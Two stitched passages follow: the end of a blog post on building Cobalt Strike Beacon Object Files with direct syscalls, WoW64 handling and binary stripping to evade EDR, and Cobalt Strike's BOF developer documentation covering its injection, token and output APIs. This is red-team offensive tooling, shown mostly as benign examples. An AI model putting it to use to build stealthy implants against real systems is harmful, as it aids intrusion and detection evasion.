program.h

In program.c, we can call these functions normally, without prepending the underscore to their name.

X86 Assembly Code

For the assembly code, we’ll need to update syscalls-asm.h to look as follows:

syscalls-asm.h

Finally, the x86 assembly will look like this:

After all these changes, we have syscalls x86 support.

WoW64 Support?

WoW64 stands for Windows on Windows64, which means there are 32-bit programs running on 64-bit Windows machines.In WoW64 processes, syscalls are not called via a syscall or sysenter instruction. Instead, a jump to fs:[0xc0] is performed. Understanding the way this works requires a long explanation, but for the purpose of this article, all we need to know is that it translates syscalls from 32 to 64-bit so that the kernel can understand them.

One quick way of “supporting” syscalls on WoW64 processes is to perform the same jump from our code. However, there are a few drawbacks when doing this. First, this is by no means a direct syscall. EDRs can hook these calls. Additionally, in some syscalls that use pointers, we will not be able to reference addresses above 32-bit.

Truly supporting direct syscalls for WoW64 processes would require us to transition via a far jmp instruction into 64-bit code, translate the parameters to their 64-bit counterparts, adjust the calling convention, set the stack alignment and more. These actions alone could make up an entire post.

That being said, jumping to fs:[0xc0] is an easy trick and at least we would have some support for WoW64, which might be useful for some scenarios.

To detect if our program is running as WoW64 process, we’ll define a function called IsWoW64:

syscalls-asm.h

#if _WIN64
#define IsWoW64 IsWoW64
__asm__("IsWoW64: \n\
mov rax, 0 \n\
ret \n\
");
#else
#define IsWoW64 IsWoW64
__asm__("IsWoW64: \n\
mov eax, fs:[0xc0] \n\
test eax, eax \n\
jne wow64 \n\
mov eax, 0 \n\
ret \n\
wow64: \n\
mov eax, 1 \n\
ret \n\
");
#endif
syscalls.h

EXTERN_C BOOL IsWoW64(void) asm ("IsWoW64");
program.c

    if(IsWoW64())
    {
        PRINT("This is a 32-bit process running on a 64-bit machine!\n");
    }
If detection is a concern when running under a WoW64 context, just call IsWow64() and bail out if it returns as true.
This can be checked on the .CNA file in Cobalt Strike:

program.cna

$barch = barch($1);
$is64 = binfo($1, "is64");
if($barch eq "x86" && $is64 == 1)
{
    berror($1, "This program does not support WoW64");
    return;
}
We’ll also need to make a small change to the function GetSyscallAddress in order to set the syscall address to fs:[0xc0] if the process Is WoW64:

PVOID GetSyscallAddress(void)
{
#ifdef _WIN64
    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
#else
    BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
#endif
 
#ifndef _WIN64
    if (IsWoW64())
    {
        // if we are a WoW64 process, jump to WOW32Reserved
        SyscallAddress = (PVOID)READ_MEMLOC(0xc0);
        return SyscallAddress;
    }
#endif
 
    // Return early if the SyscallAddress is already defined
    if (SyscallAddress)
    {
        // make sure the instructions have not been replaced
        if (!strncmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
            return SyscallAddress;
    }
 
    // set the fallback as the default
    SyscallAddress = (PVOID)DoSysenter;
    …
Finally, we’ll update our Makefile to compile for both 64 and 32-bit.

Makefile

BOFNAME := program
CC_x64 := x86_64-w64-mingw32-gcc
CC_x86 := i686-w64-mingw32-gcc
STRIP_x64 := x86_64-w64-mingw32-strip
STRIP_x86 := i686-w64-mingw32-strip
 
all:
    $(CC_x64) -c program.c -o compiled/$(BOFNAME).x64.o   -masm=intel -Wall -DBOF
    $(STRIP_x64) --strip-unneeded compiled/$(BOFNAME).x64.o
 
    $(CC_x86) -c program.c -o compiled/$(BOFNAME).x86.o   -masm=intel -Wall -DBOF
    $(STRIP_x86) --strip-unneeded compiled/$(BOFNAME).x86.o

    $(CC_x64)    program.c -o compiled/$(BOFNAME).x64.exe -masm=intel -Wall
    $(STRIP_x64) --strip-all compiled/$(BOFNAME).x64.exe
 
    $(CC_x86)    program.c -o compiled/$(BOFNAME).x86.exe -masm=intel -Wall
    $(STRIP_x86) --strip-all compiled/$(BOFNAME).x86.exe
 
clean:
    rm compiled/$(BOFNAME).*.*
Conclusion
To summarize, this post explored several technical solutions to achieve the following objectives:

Create executables as well as BOF using the same codebase
Use syscalls from ntdll.dll instead of using them directly from an unknown module
Strip executables to make them smaller and harder to analyze
Run on both 64-bit and 32-bit
Have partial support for syscalls in WoW64











You are here: Beacon Object Files
Beacon Object Files
A Beacon Object File (BOF) is a compiled C program, written to a convention that allows it to execute within a Beacon process and use internal Beacon APIs. BOFs are a way to rapidly extend the Beacon agent with new post-exploitation features.

What are the advantages of BOFs?
One of the key roles of a command & control platform is to provide ways to use external post-exploitation functionality. Cobalt Strike already has tools to use PowerShell, .NET, and Reflective DLLs. These tools rely on an OPSEC expensive fork&run pattern that involves a process create and injection for each post-exploitation action. BOFs have a lighter footprint. They run inside of a Beacon process and are memory can be controlled using the malleable c2 profile within the process-inject block.

BOFs are also very small. A UAC bypass privilege escalation Reflective DLL implementation may weigh in at 100KB+. The same exploit, built as a BOF, is <3KB. This can make a big difference when using bandwidth constrained channels, such as DNS.

Finally, BOFs are easy to develop. You just need a Win32 C compiler and a command line. Both MinGW and Microsoft's C compiler can produce BOF files. You don't have to fuss with project settings that are sometimes more effort than the code itself.

How do BOFs work?
To Beacon, a BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs.

To Cobalt Strike, a BOF is an object file produced by a C compiler. Cobalt Strike parses this file and acts as a linker and loader for its contents. This approach allows you to write position-independent code, for use in Beacon, without tedious gymnastics to manage strings and dynamically call Win32 APIs.

What are the disadvantages of BOFs?
BOFs are single-file C programs that call Win32 APIs and limited Beacon APIs. Don't expect to link in other functionality or build large projects with this mechanism.

Cobalt Strike does not link your BOF to a libc. This means you're limited to compiler intrinsics (e.g., __stosb on Visual Studio for memset), the exposed Beacon internal APIs, Win32 APIs, and the functions that you write. Expect that a lot of common functions (e.g., strlen, stcmp, etc.) are not available to you via a BOF.

BOFs execute inside of your Beacon agent. If a BOF crashes, you or a friend you value will lose access. Write your BOFs carefully.

Cobalt Strike expects that your BOFs are single-threaded programs that run for a short period of time. BOFs will block other Beacon tasks and functionality from executing. There is no BOF pattern for asynchronous or long-running tasks. If you want to build a long-running capability, consider a Reflective DLL that runs inside of a sacrificial process.





How do I develop a BOF?
Open your preferred text editor and start writing a C program. Here's a Hello World BOF:

#include <windows.h>
#include "beacon.h"

void go(char * args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "Hello World: %s", args);
}
Download beacon.h.

To compile this with Visual Studio:
cl.exe /c /GS- hello.c /Fohello.o

To compile this with x86 MinGW:
i686-w64-mingw32-gcc -c hello.c -o hello.o

To compile this with x64 MinGW:
x86_64-w64-mingw32-gcc -c hello.c -o hello.o

The commands above produce a hello.o file. Use inline-execute in Beacon to run the BOF.

beacon> inline-execute /path/to/hello.o these are arguments

beacon.h contains definitions for several internal Beacon APIs. The function go is similar to main in any other C program. It's the function that's called by inline-execute and arguments are passed to it. BeaconOutput is an internal Beacon API to send output to the operator. Not much to it.





Dynamic Function Resolution
GetProcAddress, LoadLibraryA, GetModuleHandle, and FreeLibrary are available within BOF files. You have the option to use these to resolve Win32 APIs you wish to call. Another option is to use Dynamic Function Resolution (DFR).

Dynamic Function Resolution is a convention to declare and call Win32 APIs as LIBRARY$Function. This convention provides Beacon with the information it needs to explicitly resolve the specific function and make it available to your BOF file before it runs. When this process fails, Cobalt Strike will refuse to execute the BOF and tell you which function it couldn't resolve.

Here's an example BOF that uses DFR and looks up the current domain:

#include <windows.h>
#include <stdio.h>
#include <dsgetdc.h>
#include "beacon.h"

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, 
                                                   ULONG, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

void go(char * args, int alen) {
    DWORD dwRet;
    PDOMAIN_CONTROLLER_INFO pdcInfo;

    dwRet = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &pdcInfo);
    if (ERROR_SUCCESS == dwRet) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", pdcInfo->DomainName);
    }

    NETAPI32$NetApiBufferFree(pdcInfo);
}
The above code makes DFR calls to DsGetDcNameA and NetApiBufferFree from NETAPI32. When you declare function prototypes for Dynamic Function Resolution, pay close attention to the decorators attached to the function declaration. Keywords, such as WINAPI and DECLSPEC_IMPORT are important. These decorations provide the compiler with the needed hints to pass arguments and generate the right call instruction.





Aggressor Script and BOFs
You'll likely want to use Aggressor Script to run your finalized BOF implementations within Cobalt Strike. A BOF is a good place to implement a lateral movement technique, an escalation of privilege tool, or a new reconnaissance capability.

The &beacon_inline_execute function is Aggressor Script's entry point to run a BOF file. Here is a script to run a simple Hello World program:

alias hello {
    local('$barch $handle $data $args');
    
    # figure out the arch of this session
    $barch  = barch($1);
    
    # read in the right BOF file
    $handle = openf(script_resource("hello. $+ $barch $+ .o"));
    $data   = readb($handle, -1);
    closef($handle);
    
    # pack our arguments
    $args   = bof_pack($1, "zi", "Hello World", 1234);
    
    # announce what we're doing
    btask($1, "Running Hello BOF");
    
    # execute it.
    beacon_inline_execute($1, $data, "demo", $args);
}
The script first determines the architecture of the session. An x86 BOF will only run in an x86 Beacon session. Conversely, an x64 BOF will only run in an x64 Beacon session. This script then reads target BOF into an Aggressor Script variable. The next step is to pack our arguments. The &bof_pack function packs arguments in a way that is compatible with Beacon's internal data parser API. This script uses the customary &btask to log the action the user asked Beacon to perform. And, &beacon_inline_execute runs the BOF with its arguments.

The &beacon_inline_execute function accepts the Beacon ID as the first argument, a string containing the BOF content as a second argument, the entry point as its third argument, and the packed arguments as its fourth argument. The option to choose an entrypoint exists in case you choose to combine like-functionality into a single BOF.

Here is the C program that corresponds to the above script:

/*
 * Compile with:
 * x86_64-w64-mingw32-gcc -c hello.c -o hello.x64.o
 * i686-w64-mingw32-gcc -c hello.c -o hello.x86.o
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "beacon.h"

void demo(char * args, int length) {
    datap  parser;
    char * str_arg;
    int    num_arg;
    
    BeaconDataParse(&parser, args, length);
    str_arg = BeaconDataExtract(&parser, NULL);
    num_arg = BeaconDataInt(&parser);
    
    BeaconPrintf(CALLBACK_OUTPUT, "Message is %s with %d arg", str_arg, num_arg);
}
The demo function is our entrypoint. We declare the datap structure on the stack. This is an empty and uninitiated structure with state information for extracting arguments prepared with &bof_pack. BeaconDataParse initializes our parser. BeaconDataExtract extracts a length-prefixed binary blob from our arguments. Our pack function has options to pack binary blobs as zero-terminated strings encoded to the session's default character set, a zero-terminated wide-character string, or a binary blob without transformation. The BeaconDataInt extracts an integer that was packed into our arguments. BeaconPrintf is one way to format output and make it available to the operator.






BOF C API
Data Parser API
The Data Parser API extracts arguments packed with Aggressor Script's &bof_pack function.

Extract a length-prefixed binary blob. The size argument may be NULL. If an address is provided, the size is populated with the number-of-bytes extracted.

char * BeaconDataExtract (datap * parser, int * size)

Extract a 4b integer.

int BeaconDataInt (datap * parser)

Get the amount of data left to parse.

int BeaconDataLength (datap * parser)

Prepare a data parser to extract arguments from the specified buffer.

void BeaconDataParse (datap * parser, char * buffer, int size)

Extract a 2b integer.

short BeaconDataShort (datap * parser)

Output API
The Output API returns output to Cobalt Strike.

Format and present output to the Beacon operator.

void BeaconPrintf (int type, char * fmt, ...)

Send output to the Beacon operator.

void BeaconOutput (int type, char * data, int len)

Each of these functions accepts a type argument. This type determines how Cobalt Strike will process the output and what it will present the output as. The types are:

CALLBACK_OUTPUT is generic output. Cobalt Strike will convert this output to UTF-16 (internally) using the target's default character set.

CALLBACK_OUTPUT_OEM is generic output. Cobalt Strike will convert this output to UTF-16 (internally) using the target's OEM character set. You probably won't need this, unless you're dealing with output from cmd.exe.

CALLBACK_ERROR is a generic error message.

CALLBACK_OUTPUT_UTF8 is generic output. Cobalt Strike will convert this output to UTF-16 (internally) from UTF-8.

Format API
The format API is used to build large or repeating output.

Allocate memory to format complex or large output.

void BeaconFormatAlloc (formatp * obj, int maxsz)

Append data to this format object.

void BeaconFormatAppend (formatp * obj, char * data, int len)

Free the format object.

void BeaconFormatFree (formatp * obj)

Append a 4b integer (big endian) to this object.

void BeaconFormatInt (formatp * obj, int val)

Append a formatted string to this object.

void BeaconFormatPrintf (formatp * obj, char * fmt, ...)

Resets the format object to its default state (prior to re-use).

void BeaconFormatReset (formatp * obj)

Extract formatted data into a single string. Populate the passed in size variable with the length of this string. These parameters are suitable for use with the BeaconOutput function.

char * BeaconFormatToString (formatp * obj, int * size)

Internal APIs
The following functions manipulate the token used in the current Beacon context:

Apply the specified token as Beacon's current thread token. This will report the new token to the user too. Returns TRUE if successful. FALSE is not.

BOOL BeaconUseToken (HANDLE token)

Drop the current thread token. Use this over direct calls to RevertToSelf. This function cleans up other state information about the token.

void BeaconRevertToken ()

Returns TRUE if Beacon is in a high-integrity context.

BOOL BeaconIsAdmIn ()

The following functions provide some access to Beacon's process injection capability:

Populate the specified buffer with the x86 or x64 spawnto value configured for this Beacon session.

void BeaconGetSpawnTo (BOOL x86, char * buffer, int length)

This function spawns a temporary process accounting for ppid, spawnto, and blockdlls options. Grab the handle from PROCESS_INFORMATION to inject into or manipulate this process. Returns TRUE if successful.

BOOL BeaconSpawnTemporaryProcess (BOOL x86, BOOL ignoreToken, STARTUPINFO * sInfo, PROCESS_INFORMATION * pInfo)

This function will inject the specified payload into an existing process. Use payload_offset to specify the offset within the payload to begin execution. The arg value is for arguments. arg may be NULL.

void BeaconInjectProcess (HANDLE hProc, int pid, char * payload, int payload_len, int payload_offset, char * arg, int arg_len)

This function injects the specified payload into a temporary process that your BOF opted to launch. Use payload_offset to specify the offset within the payload to begin execution. The arg value is for arguments. arg may be NULL.

void BeaconInjectTemporaryProcess (PROCESS_INFORMATION * pInfo, char * payload, int payload_len, int payload_offset, char * arg, int arg_len)

This function cleans up some handles that are often forgotten about. Call this when you're done interacting with the handles for a process. You don't need to wait for the process to exit or finish.

void BeaconCleanupProcess (PROCESS_INFORMATION * pInfo)

The following functions are used to access stored items in Beacon Data Store:

Returns a pointer to the specific item. If there is no entry at that index, the function returns NULL.

PDATA_STORE_OBJECT BeaconDataStoreGetItem (size_t index)

This function obfuscates a specific item in Beacon Data Store.

void BeaconDataStoreProtectItem (size_t index)

This function un-obfuscates a specific item in Beacon Data Store.

void BeaconDataStoreUnprotectItem (size_t index)

Return the maximum size of Beacon Data Store.

size_t BeaconDataStoreMaxEntries ()

The following function is a utility function:

Convert the src string to a UTF16-LE wide-character string, using the target's default encoding. max is the size (in bytes!) of the destination buffer.

BOOL toWideChar (char * src, wchar_t * dst, int max)

This function returns information about beacon such as the beacon address, sections to mask, heap records to mask, the mask, sleep mask address and sleep mask size information.

void BeaconInformation (BEACON_INFO * info);

The following functions provide access to Beacon's key value store:

This function adds a memory address to an internal key value store to allow the ability to retrieve this value using the key in a subsequent BOF execution.

BOOL BeaconAddValue (const char * key, void * ptr);

This function retrieves the memory address that is associated with the key from the internal key value store. If the key is not found then NULL is returned.

void * BeaconGetValue (const char * key);

This function removes the key from the internal key value store. This will not do any memory clean up of the memory address and a finial execution of a BOF should do the necessary clean up in order to prevent memory leaks.

BOOL BeaconRemoveValue (const char * key);

The following function retrieves the custom data buffer from Beacon User Data.

char* BeaconGetCustomUserData ()

When a User Defined Reflective Loader provides Beacon User Data (BUD) during the loading process, then this function will return a pointer to the custom buffer array associated with the BUD. The size of this buffer array is fixed at 32 bytes, as defined in the USER_DATA structure. A valid memory pointer is always returned. If no BUD is provided by the User Defined Reflective Loader, then the pointer is to the default buffer array with all 32 values set to zero.




Formatting BOF Output
The beacon format API allows you to modify how beacon returns data to the user to suit the users Need. Data returned in a loop is an obvious example and use-case for this API.

Without the BeaconFormat API, beacon will send the output back to you every time you use the BeaconPrintf API call. This could lead to formatting that is less than ideal.

The best way to illustrate the problem is by using some examples.

Example - Simple counting BOF using a loop:
Copy
Counting BOF Example
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
    #include <windows.h>
    #include "beacon.h"
    #include "bofdefs.h"
     
    void LoopExample()
    {
        int i;
        for(i=0;i<11;i++)
        {
            BeaconPrintf(CALLBACK_OUTPUT,"counter is currently at %i",i);
        }
    }
         
    void go(char * args, int len) {         
        LoopExample();
    }
When the code is executed, you should see the following result:



figure 68 - Example 1 Output

As expected, the output is served back in chunks, displaying spacing in between even though a new line character was not specified because BeaconPrintf automatically adds a new line for you.

If you modify the Beacon Object File to use the Beacon Format API instead, you can gain more control over what the output looks like with following steps:

First, allocate memory to format the output.
Once the buffer is allocated and there is a pointer to the buffer, append to the buffer using the append APIs like BeaconFormatAppend, BeaconFormatint and BeaconFormatPrintf.
When satisfied with the buffer, print it out using BeaconFormatToString
Afterwards, you can either reuse the buffer for additional operations using BeaconFormatReset or, if you are done with it, free up the allocated memory using BeaconFormatFree.
Example - Using this approach in the counting BOF
Copy
Counting BOF Example 2
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
    #include <windows.h>
    #include "beacon.h"
    #include "bofdefs.h"
     
    void LoopExampleWithFormatting()
    {
        //1. create the new buffer pointer
        formatp buffer;
     
        //2. allocate memory to hold the formatted data
        BeaconFormatAlloc(&buffer,1024);
              
        int i;
        for(i=0;i<11;i++)
        {
            //3. instead of printing, we will now fill the buffer - notice the new line character!
            BeaconFormatPrintf(&buffer, "counter is currently at: %i\n",i);
        }
     
        //4. now that we have our filled up buffer, let's print it out
        BeaconPrintf(CALLBACK_OUTPUT,"%s\n",BeaconFormatToString(&buffer,NULL));
     
        //5. time to free up the buffer
        BeaconFormatFree(&buffer);     
    }
     
    void LoopExample()
    {
        int i;
        for(i=0;i<11;i++)
        {
            BeaconPrintf(CALLBACK_OUTPUT,"counter is currently at %i",i);
        }
    }
     
    void go(char * args, int len) {     
        LoopExampleWithFormatting();
    }
When the code is executed, you should see the following result:



Example - Read the virtual memory of the current process
Copy
Read Virtual Memory Example
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
    #include <windows.h>
    #include "beacon.h"
    #include "bofdefs.h"
         
    HMODULE GetModHandle(LPCSTR module)
    {
        HMODULE hModule = KERNEL32$GetModuleHandleA(module);
        return hModule ? hModule : KERNEL32$LoadLibraryA(module);
    }
         
    LPVOID GetMemptr(LPCSTR module, LPCSTR function)
    {
        HMODULE hModule = GetModHandle(module);
        LPVOID memPtr = KERNEL32$GetProcAddress(hModule,function);
        return memPtr? memPtr : NULL;
    }
     
    //format options: 1 decompile format, any other number - raw opcodes
    void ReadvirtualMemory(LPCSTR module, LPCSTR function,int size, int format)
    {
        LPVOID memPtr = GetMemptr(module,function);
        if(!memPtr)
        {
            BeaconPrintf(CALLBACK_ERROR,"no memptr found\n");
            return;
        }
        else
        {
            formatp buffer;
            BeaconFormatAlloc(&buffer,1024);
            BYTE *readbuffer = (BYTE*)MSVCRT$malloc(size);
            SIZE_T bytesread = 0;
            KERNEL32$ReadProcessMemory((HANDLE)-1,memPtr,readbuffer,size,&bytesread);
            BeaconFormatPrintf(&buffer, "showing the first %i opcodes of %s!%s\n",size,module,function);
             
            for(int i = 0; i < size; i++)
            {
                if(format == 1)
                {
                    BeaconFormatPrintf(&buffer,"\\x%02X",readbuffer[i]);
                }
                else
                {
                    BeaconFormatPrintf(&buffer,"%02X",readbuffer[i]);
                }
            }
            BeaconPrintf(CALLBACK_OUTPUT,"%s\n",BeaconFormatToString(&buffer,NULL));
            BeaconFormatFree(&buffer);
            MSVCRT$free(readbuffer);
       }  
    }
    void go(char * args, int len) {
      char* module;
      char* function;
      int size;
      int format;
      datap parser;
      BeaconDataParse(&parser, args, len);
      module = BeaconDataExtract(&parser,NULL);
      function = BeaconDataExtract(&parser,NULL);
      size = BeaconDataInt(&parser);
      format = BeaconDataInt(&parser);
      ReadvirtualMemory(module, function, size, format);
    }    
In this BOF, users have the option to read an arbitrary number of bytes of a function within the current process and display it in specific formats. Using the BeaconFormatAPI, this becomes trivial to do.

For example, you can display bytes as follows:



This makes it easy to copy paste the output and put it in a decompiler like so:



Others would rather have all the bytes right next to each other like so: